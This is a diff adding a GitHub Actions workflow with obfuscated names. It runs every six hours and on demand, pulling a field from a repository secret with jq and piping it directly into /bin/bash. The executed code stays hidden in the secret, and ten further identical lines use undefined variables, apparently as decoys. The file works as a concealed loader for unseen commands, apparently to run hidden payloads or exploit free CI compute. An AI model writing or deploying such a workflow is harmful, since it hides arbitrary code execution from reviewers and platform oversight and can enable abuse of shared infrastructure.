@@ -1,0 +1,28 @@
+name: yushihuo2468
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yushihuo2468
+        env:
+          diu3913: ${{ secrets.diu3913 }}
+        run: |
+          echo $diu3913 | jq -r .ufjqf3905 | /bin/bash
+          echo $bzd4 | jq -r .zu44 | /bin/bash
+          echo $tv3 | jq -r .d0242 | /bin/bash
+          echo $udws0 | jq -r .si5675 | /bin/bash
+          echo $bv548 | jq -r .y1620 | /bin/bash
+          echo $yoa4123 | jq -r .mxozv499 | /bin/bash
+          echo $frrge673 | jq -r .sgo873 | /bin/bash
+          echo $s788 | jq -r .aym3 | /bin/bash
+          echo $mwakz3 | jq -r .vi00044 | /bin/bash
+          echo $p9 | jq -r .hu3 | /bin/bash
+          echo $mmvyx78183 | jq -r .f48871 | /bin/bash
+
